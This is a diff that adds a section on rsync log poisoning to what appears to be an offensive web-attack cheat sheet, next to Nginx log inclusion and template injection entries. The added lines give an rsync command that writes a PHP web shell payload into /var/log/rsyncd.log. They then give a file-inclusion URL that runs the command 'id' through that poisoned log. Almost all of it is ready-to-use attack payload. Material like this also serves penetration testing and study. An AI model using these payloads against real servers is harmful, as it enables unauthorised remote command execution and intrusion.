@@ -349,6 +349,19 @@ Nginx: file.php?file=`/var/log/nginx/access.log&cmd=id`
 
 ---
 
+
+# <kbd>Log Poisoning RSYNC</kbd>
+
+/var/log/rsyncd.log
+
+```cmd
+rsync 192.168.1.2::'<?php system($_GET["cmd"]); ?>'
+```
+
+file.php?file=`/var/log/rsyncd.log&cmd=id`
+
+---
+
 # <kbd>Server Side Template Injection</kbd>
 
 ```python
